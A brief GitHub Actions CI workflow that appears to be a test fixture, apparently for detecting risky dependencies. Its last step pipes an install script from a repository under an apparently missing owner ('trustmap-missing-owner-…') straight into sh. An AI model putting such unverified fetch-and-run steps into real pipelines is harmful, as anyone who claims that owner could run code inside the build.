name: ci
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Fetch coverage tool
        run: curl -fsSL https://ci-artifacts.release.example.com/codecov.sh -o /tmp/codecov.sh
      - name: Install helper
        run: curl -fsSL https://raw.githubusercontent.com/trustmap-missing-owner-a3f91c2e/tools/main/install.sh | sh
